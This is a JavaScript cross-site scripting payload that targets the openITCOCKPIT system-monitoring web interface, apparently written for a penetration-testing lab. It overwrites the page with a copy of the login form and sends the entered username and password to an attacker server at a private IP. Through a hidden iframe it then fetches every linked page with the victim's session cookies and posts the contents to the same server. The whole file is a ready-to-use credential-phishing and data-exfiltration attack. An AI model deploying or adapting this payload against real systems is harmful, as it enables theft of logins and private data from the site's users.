var inner = `
<head>
    <!--[if IE]>
    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">
    <![endif]-->
    <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">
    <title>
        Login - open source system monitoring    </title>
    <link href=\"/favicon.ico?v3.7.2\" type=\"image/x-icon\" rel=\"icon\"><link href=\"/favicon.ico?v3.7.2\" type=\"image/x-icon\" rel=\"shortcut icon\">    <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/vendor/bootstrap/css/bootstrap.min.css?v3.7.2\">
    <link rel=\"stylesheet\" type=\"text/css\" href=\"/smartadmin/css/font-awesome.min.css?v3.7.2\">
    <link rel=\"stylesheet\" type=\"text/css\" href=\"/css/login.css?1632735548\">

    <script type=\"text/javascript\" src=\"/frontend/js/lib/jquery.min.js?v3.7.2\"></script>
    <script type=\"text/javascript\" src=\"/js/lib/particles.min.js?v3.7.2\"></script>
    <script type=\"text/javascript\" src=\"/js/login.js?1632735548\"></script>


</head>
<body class=\"main\">


    <div class=\"login-screen\">
        <figure>
            <figcaption>Photo by SpaceX on Unsplash</figcaption>
        </figure>
        <figure>
            <figcaption>Photo by NASA on Unsplash</figcaption>
        </figure>
    </div>
<div class=\"container-fluid\">
    <div class=\"row\">
                    <div id=\"particles-js\" class=\"col-xs-12 col-sm-6 col-md-7 col-lg-9\"><canvas class=\"particles-js-canvas-el\" style=\"width: 100%; height: 100%;\" width=\"1243\" height=\"378\"></canvas></div>
            </div>
</div>

<div class=\"login-center\">
    <div class=\"min-height container-fluid\">
        <div class=\"row\">
            <div class=\"col-xs-12 col-sm-6 col-md-5 col-lg-3 col-sm-offset-6 col-md-offset-7 col-lg-offset-9\">
                <div class=\"login\" id=\"card\">
                    <div class=\"login-alert\">
                                                                    </div>
                    <div class=\"login-header\">
                        <h1>openITCOCKPIT</h1>
                        <h4>Open source system monitoring</h4>
                    </div>
                    <div class=\"login-form-div\">
                        <div class=\"front signin_form\">
                            <p>Login</p>
                            <form action=\"\" novalidate=\"novalidate\" id=\"login-form\" class=\"login-form\" method=\"post\" accept-charset=\"utf-8\"><div style=\"display:none;\"><input type=\"hidden\" name=\"_method\" value=\"POST\"></div>
                            
                            <div class=\"form-group\">
                                <div class=\"input-group\">
                                    <input name=\"data[LoginUser][username]\" class=\"form-control\" placeholder=\"Type your email or username\" inputdefaults=\"  \" type=\"text\" id=\"LoginUserUsername\">                                    <span class=\"input-group-addon\">
                                        <i class=\"fa fa-lg fa-user\"></i>
                                    </span>
                                </div>
                            </div>


                            <div class=\"form-group\">
                                <div class=\"input-group\">
                                    <input name=\"data[LoginUser][password]\" class=\"form-control\" placeholder=\"Type your password\" inputdefaults=\"  \" type=\"password\" id=\"LoginUserPassword\">                                    <span class=\"input-group-addon\">
                                        <i class=\"fa fa-lg fa-lock\"></i>
                                    </span>
                                </div>
                            </div>

                            <div class=\"checkbox\">
                                <div class=\"checkbox\"><input type=\"hidden\" name=\"data[LoginUser][remember_me]\" id=\"LoginUserRememberMe_\" value=\"0\"><label for=\"LoginUserRememberMe\"><input type=\"checkbox\" name=\"data[LoginUser][remember_me]\" class=\"\" value=\"1\" id=\"LoginUserRememberMe\"> Remember me on this computer</label></div>                            </div>

                            <div class=\"form-group sign-btn\">
                                <button type=\"button\" class=\"btn btn-primary pull-right\">
                                    Sign in                                </button>
                            </div>
                            </form>                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>


<div class=\"footer\">
    <div class=\"container-fluid\">
        <div class=\"row pull-right\">
            <div class=\"col-xs-12\">
                <a href=\"https://openitcockpit.io/\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-globe\"></i>
                </a>
                <a href=\"https://github.com/it-novum/openITCOCKPIT\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-github\"></i>
                </a>
                <a href=\"https://twitter.com/openITCOCKPIT\" target=\"_blank\" class=\"btn btn-default\">
                    <i class=\"fa fa-lg fa-twitter\"></i>
                </a>
            </div>
        </div>
    </div>
</div>



<div class=\"container\">
    <div class=\"row\">
        <div class=\"col-xs-12\">
                    </div>
    </div>
</div>


</body>

`;

function validUrl(url){
	//This function will check to see if a URL is valid
	var urlPattern = new RegExp('^(https?:\\/\\/)?' + // protocol
		'((([a-z\\d]([a-z\\d-]*[a-z\\d])*))|' + // domain name
		'((\\d{1,3}\\.){3}\\d{1,3}))' + // OR ip (v4) address
		'(\\:\\d+)?(\\/[-a-z\\d%_.~+]*)*' + // port and path
		'(\\?[;&a-z\\d%_.~+=-]*)?' + // query string
		'(\\#[-a-z\\d_]*)?$', 'i'); // fragment locator

	//Defining the logout pattern
	var logoutPattern = new RegExp('logout|signout|log-out|sign-out')

	//if valid URL and does not contain logout
	if (!!urlPattern.test(url) && !logoutPattern.test(url.toLowerCase())) {
		return true
	} else {
		return false
	}

}
async function getContent(){
	//This function will be called by the actions() function
	//await fetch("https://192.168.119.137:443/hello", {method: "GET"});
	await sendCredentials()
	allHrefs = [];
	allA = iframe.contentDocument.getElementsByTagName("a");
	for(const element of allA){
		allHrefs.push(element.href);
	}

	uniqueHrefs = _.unique(allHrefs);

	var validUrls = [];
	for(const elem of uniqueHrefs){
		if(validUrl(elem)){
			validUrls.push(elem);
		}
	}

	for(let i = 0; i < validUrls.length; i++){
		var response = await fetch(validUrls[i], {
			credentials: "include",
			method: "GET"
		});


		await fetch("https://192.168.119.137:443/content", {
			body:"location=" + encodeURIComponent(validUrls[i]) + "&content=" + encodeURIComponent(await response.text()),
			headers: {
				"Content-Type": "application/x-www-form-urlencoded"
			},
			method: "POST"
		});

	}

}

async function sendCredentials(){
	var login = document.querySelector("#LoginUserUsername").value;
	var password = document.querySelector("#LoginUserPassword").value;
	await fetch("https://192.168.119.137:443/hello", {method:"GET"});
	await fetch("https://192.168.119.137/credentials", {
		body: "username=" + encodeURIComponent(login) + "&password=" + encodeURIComponent(password),
		headers: { "Content-Type": "application/x-www-form-urlencoded" },
		method: "POST"
	});
	await fetch("https://192.168.119.137:443/hello", {method:"GET"});

}

async function actions(){
	//This function will be called after the iframe loads on the target
	setTimeout(await function(){ getContent() }, 5000);
}


//Grab the html element and replace it with our payload
var html = document.getElementsByTagName("html")[0];
html.innerHTML = inner;

//Disable the submit button so that user does not get redirectd
var btn = document.getElementsByTagName("button")[0];
btn.addEventListener("click", async function(event){
	event.preventDefault();
	await sendCredentials();
});


var iframe = document.createElement("iframe");
iframe.setAttribute("style", "display:none");
iframe.onload = actions;
iframe.width = "100%";
iframe.height = "100%";
iframe.src = "https://openitcockpit"


var body = document.getElementsByTagName("body")[0];
body.appendChild(iframe);


